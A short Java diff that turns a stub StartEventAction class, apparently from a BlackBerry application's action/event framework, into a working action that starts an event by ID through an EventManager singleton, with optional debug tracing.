@@ -1,23 +1,29 @@
 package blackberry.action;
 
+import blackberry.EventManager;
+import blackberry.Trigger;
 import blackberry.config.ConfAction;
-import blackberry.event.Event;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 
-public class StartEventAction extends SubAction {
-
-    public StartEventAction(ConfAction conf) {
-        super(conf);
-        // TODO Auto-generated constructor stub
+public class StartEventAction extends EventAction {
+    //#ifdef DEBUG
+    private static Debug debug = new Debug("StartEventAction",
+            DebugLevel.VERBOSE);
+    //#endif
+    public StartEventAction(ConfAction params) {
+        super( params);
     }
 
-    public boolean execute(Event event) {
-        // TODO Auto-generated method stub
-        return false;
-    }
+    public boolean execute(Trigger trigger) {
+        //#ifdef DEBUG
+        debug.trace("execute: "+eventId);
+        //#endif
 
-    protected boolean parse(byte[] confParams) {
-        // TODO Auto-generated method stub
-        return false;
+        final EventManager eventManager = EventManager.getInstance();
+
+        eventManager.start(Integer.toString(eventId));
+        return true;
     }
 
 }
